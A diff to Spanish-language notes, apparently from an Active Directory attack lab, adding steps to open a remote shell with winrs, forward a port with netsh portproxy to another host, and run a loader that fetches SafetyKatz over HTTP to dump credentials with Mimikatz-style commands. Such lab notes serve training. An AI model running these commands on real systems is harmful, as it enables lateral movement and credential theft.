@@ -380,4 +380,18 @@ Ahora copiaremos el *Loader.exe* a la maquina
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
 ```
 
-Y haremos el reenvio de puertos
+Y haremos el renvio de puertos primero nos conectaremos a la maquina obteniendo una CMD
+```shell
+winrs -r:dcorp-adminsrv cmd
+```
+
+Y haremos el renvio de puertos, deberemos ejecutarlo como administrador
+```shell
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
+
+Y en la maquina victima ejecutar el *SafetyKatz*
+```shell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+```
+
